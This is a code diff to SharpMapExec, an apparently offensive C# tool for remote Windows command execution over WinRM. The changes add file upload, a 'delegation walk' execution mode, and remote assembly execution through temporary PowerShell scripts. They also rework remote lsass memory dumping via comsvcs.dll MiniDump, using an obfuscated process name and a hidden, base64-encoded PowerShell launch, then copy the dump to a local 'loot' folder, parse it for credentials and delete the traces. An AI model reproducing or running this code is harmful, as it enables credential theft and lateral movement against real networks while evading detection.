@@ -4,18 +4,19 @@ using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.Diagnostics;
 using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Text;
 using System.Threading;
 using static SharpMapExec.Helpers.SecurityContext;
+using static SharpMapExec.Helpers.Misc;
 
 namespace SharpMapExec.Lib
 {
     public class Wsman
     {
+        
         public static (Collection<PSObject>, Collection<ErrorRecord>) InvokeJeaCommand(string computer, string command, string auth = "ntlm", string scheme = "HTTP", bool display = true)
         {
             Collection<PSObject> result = new Collection<PSObject>();
@@ -78,7 +79,7 @@ namespace SharpMapExec.Lib
             return (result, error);
         }
 
-        public static (Collection<PSObject>, Collection<ErrorRecord>) InvokeCommand(string computer, string argument, bool AsSystem = false, string auth = "ntlm", string scheme = "HTTP", bool display = true, bool AmsiBypass = false)
+        public static (Collection<PSObject>, Collection<ErrorRecord>) InvokeCommand(string computer, string argument, bool AsSystem = false, string auth = "ntlm", string scheme = "HTTP", bool display = true, bool AmsiBypass = false, bool delegWalk = false)
         {
             Collection<PSObject> result = new Collection<PSObject>();
             Collection<ErrorRecord> error = new Collection<ErrorRecord>();
@@ -99,6 +100,10 @@ namespace SharpMapExec.Lib
             if (AsSystem)
             {
                 argument = PsFunction.RunAsSystem(argument);
+            }
+            if (delegWalk)
+            {
+                argument = PsFunction.RunDelegationWalk(argument);
             }
             try
             {
@@ -215,7 +220,55 @@ namespace SharpMapExec.Lib
             }
         }
 
-        public static void CopyFile(string computer, string path, string destination, bool delete = false, string auth = "ntlm", string scheme = "http")
+        public static void UploadFile(string computer, string path, string destination, string auth = "ntlm", string scheme = "http")
+        {
+            if (auth != "kerberos")
+            {
+                auth = "Negotiate";
+            }
+            try
+            {
+                string data = Compress(File.ReadAllBytes(path));
+                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.UploadFile(data, destination), false, auth, scheme, true);
+                foreach (PSObject obj in result)
+                {
+                    if (obj.ToString().Length == 0)
+                    {
+                        Console.WriteLine("  [-] Upload Failed");
+                    }
+                }
+            }
+            catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        public static void UploadContent(string computer, string content, string destination, string auth = "ntlm", string scheme = "http")
+        {
+            if (auth != "kerberos")
+            {
+                auth = "Negotiate";
+            }
+            try
+            {
+                string data = Compress(Encoding.ASCII.GetBytes(content));
+                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.UploadFile(data, destination), false, auth, scheme, true);
+                foreach (PSObject obj in result)
+                {
+                    if (obj.ToString().Length == 0)
+                    {
+                        Console.WriteLine("  [-] Upload Failed");
+                    }
+                }
+            }
+            catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        public static void CopyFile(string computer, string path, string destination, bool delete = false, string auth = "ntlm", string scheme = "http", bool parseLsass = false)
         {
             if (auth != "kerberos")
             {
@@ -233,25 +286,20 @@ namespace SharpMapExec.Lib
                     else
                     {
                         byte[] compressfile = Convert.FromBase64String(obj.ToString());
-                        using (var memoryStream = new MemoryStream(compressfile))
+                        byte[] data = Decompress(compressfile);
+                        if (parseLsass)
                         {
-                            using (var gzip = new GZipStream(memoryStream, CompressionMode.Decompress))
-                            {
-                                using (var decompressed = new MemoryStream())
-                                {
-                                    gzip.CopyTo(decompressed);
-                                    File.WriteAllBytes(destination, decompressed.ToArray());
-                                    Console.WriteLine(String.Format("  [+] Copied {0}kb to {1}", decompressed.ToArray().Length, destination));
-                                }
-                            }
+                            Minidump.Program.parse(data);
                         }
+                        File.WriteAllBytes(destination, data.ToArray());
+                        Console.WriteLine(String.Format("  [+] Copied {0}kb to {1}", data.ToArray().Length, destination));
                     }
                 }
                 if (delete)
                 {
                     try
                     {
-                        (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("remove-item {0} -force", path), false, auth, scheme);
+                        (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
                     }
                     catch
                     {
@@ -268,10 +316,28 @@ namespace SharpMapExec.Lib
         public static void ExecuteAssembly(string computer, string path, string argument, List<string> flags, string auth = "ntlm", string scheme = "HTTP")
         {
             Console.WriteLine("[*] Executing Assembly");
-            string command = PsFunction.ExecuteAssembly(path, argument, flags);
+            string caller;
+            string randomPath = "C:\\windows\\temp\\" + Guid.NewGuid().ToString() + ".ps1";
+            string command = PsFunction.ExecuteAssembly(path, argument);
+
+            if (flags.Contains("system"))
+            {
+                caller = PsFunction.RunAsSystem(randomPath);
+                UploadContent(computer, command, randomPath, auth, scheme);
+            }
+            else if (flags.Contains("delegwalk"))
+            {
+                caller = PsFunction.RunDelegationWalk(randomPath);
+                UploadContent(computer, command, randomPath, auth, scheme);
+            }
+            else
+            {
+                caller = command;
+            }
+
             try
             {
-                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, command, false, auth, scheme);
+                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, caller, false, auth, scheme);
                 foreach (var obj in result)
                 {
                     Console.WriteLine(obj.ToString());
@@ -281,10 +347,22 @@ namespace SharpMapExec.Lib
                     Console.WriteLine("[-] Error While Executing Assembly");
                     return;
                 }
+                //delete uploaded ps file
+                if (caller != command)
+                {
+                    try
+                    {
+                        (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", randomPath), false, auth, scheme);
+                    }
+                    catch
+                    {
+                        Console.WriteLine(String.Format("  [-] Failed to delete {0}", randomPath));
+                    }
+                }
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Failed to Executing Assembly");
+                Console.WriteLine("[-] Failed While Executing Assembly");
                 Console.WriteLine(e);
                 return;
             }
@@ -293,38 +371,46 @@ namespace SharpMapExec.Lib
         public static void InvokeComSvcsLsassDump(string computer, string auth = "ntlm", string scheme = "HTTP")
         {
             Console.WriteLine("[*] Dumping lsass");
-            string ecmd = @"C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('l'+'s'+'a'+'s'+'s')).Id C:\windows\temp\Coredump.dmp full";
-            string argument = String.Format(@"start-process powershell -WindowStyle Hidden -ArgumentList '-NoP -enc {0} ' -wait ; test-path C:\Windows\temp\Coredump.dmp", Convert.ToBase64String(Encoding.Unicode.GetBytes(ecmd)));
+            string path = "C:\\Windows\\temp\\" + Guid.NewGuid().ToString() + ".dmp";
+            string ecmd = string.Format(@"C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('l'+'s'+'a'+'s'+'s')).Id {0} full", path);
+            string argument = string.Format(@"start-process powershell -WindowStyle Hidden -ArgumentList '-NoP -enc {0} ' -wait ; test-path {1}", Convert.ToBase64String(Encoding.Unicode.GetBytes(ecmd)), path);
             //string argument = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\windows\\temp\\Coredump.dmp full; Wait-Process rundll32";
             string destination = Path.Combine("loot", computer, "lsass.dmp");
-            string path = "C:\\Windows\\temp\\Coredump.dmp";
             try
             {
                 (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, false, auth, scheme);
                 if (errors.Count > 0)
                 {
                     Console.WriteLine("[-] Failed to Dump Lsass");
-                    return;
+                    throw new Exception();
                 }
                 if(result[0].ToString() == "False")
                 {
                     Console.WriteLine("[-] Failed to Dump Lsass");
+                    throw new Exception();
+                }
+                try
+                {
+                    Console.WriteLine("[*] Copying lsass dump");
+                    CopyFile(computer, path, destination, true, parseLsass: true);
                     return;
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Failed to Copy Lsass Dump File");
                 }
             }
             catch
             {
                 Console.WriteLine("[-] Failed to Dump Lsass");
-                return;
             }
             try
             {
-                Console.WriteLine("[*] Copying lsass dump");
-                CopyFile(computer, path, destination, true);
+                (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
             }
             catch
             {
-                Console.WriteLine("[-] Failed to Copy Lsass Dump File");
+                Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
             }
         }
 
@@ -499,11 +585,16 @@ namespace SharpMapExec.Lib
             bool checkadmin = false;
             StringBuilder stringBuilder = new StringBuilder();
             bool AsSystem = false;
+            bool delegWalk = false;
             bool DisableAmsi = false;
 
             if (flags.Contains("system"))
             {
                 AsSystem = true;
+            }
+            else if (flags.Contains("delegwalk"))
+            {
+                delegWalk = true;
             }
             if (argument.Length == 0)
             {
@@ -516,7 +607,7 @@ namespace SharpMapExec.Lib
             }
             try
             {
-                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, AsSystem, auth, scheme, false, DisableAmsi);
+                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, AsSystem, auth, scheme, false, DisableAmsi, delegWalk: delegWalk);
                 foreach (PSObject obj in result)
                 {
                     stringBuilder.AppendLine(obj.ToString());
